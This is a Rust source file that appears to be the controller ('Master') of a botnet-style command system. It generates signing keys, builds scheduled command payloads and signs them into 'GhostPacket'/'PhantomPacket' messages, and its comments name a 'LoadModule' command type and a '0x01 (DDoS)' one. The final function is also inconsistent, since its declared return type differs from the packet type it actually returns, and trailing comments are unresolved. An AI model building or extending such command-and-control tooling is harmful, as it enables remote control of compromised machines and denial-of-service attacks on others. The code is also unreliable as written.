use ed25519_dalek::{Signer, SigningKey, VerifyingKey};
use rand::rngs::OsRng;
use std::fs;
use std::path::PathBuf;
use protocol::{CommandPayload, GhostPacket};
use uuid;

pub fn generate_key(output: &PathBuf) -> String {
    let mut csprng = OsRng;
    let signing_key = SigningKey::generate(&mut csprng);
    let verifying_key = VerifyingKey::from(&signing_key);
    
    fs::write(output, signing_key.to_bytes()).expect("Failed to write key");
    
    let pub_hex = hex::encode(verifying_key.to_bytes());
    let pub_path = output.with_extension("pub");
    fs::write(pub_path, &pub_hex).expect("Failed to write public key");
    
    pub_hex
}

pub fn load_key(path: &PathBuf) -> SigningKey {
    let key_bytes = fs::read(path).expect("Failed to read key file");
    let arr: [u8; 32] = key_bytes[0..32].try_into().expect("Invalid key length");
    SigningKey::from_bytes(&arr)
}

pub fn create_payload(cmd_str: String) -> CommandPayload {
    // Default ExecuteAt = Now + 60s
    let execute_at = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64 + 60;
    
    // Split "ACTION PARAMETERS"
    let (action, parameters) = match cmd_str.split_once(' ') {
        Some((a, p)) => (a.to_string(), p.to_string()),
        None => (cmd_str, String::new()),
    };

    CommandPayload {
        id: uuid::Uuid::new_v4().to_string(),
        action,
        parameters,
        execute_at,
        reply_to: None,
    }
}

pub fn sign_command(payload: &CommandPayload, key: &SigningKey) -> GhostPacket {
    let payload_json = serde_json::to_string(payload).unwrap();
    let data = payload_json.as_bytes().to_vec();
    
    // For now, Master uses a generic command type or specific if we passed it. 
    // But sign_command takes CommandPayload. 
    // Protocol's PhantomPacket::new handles signing.
    
    use protocol::{PhantomPacket, CommandType};
    PhantomPacket::new(CommandType::LoadModule, data, key) 
    // Wait, CommandType needs to vary? For now let's use LoadModule as placeholder or Generic?
    // The previous code had specific actions in payload.
    // Let's use 0x01 (DDoS) or add a specific "Admin" type? 
    // Existing CommandType has LoadModule.
}
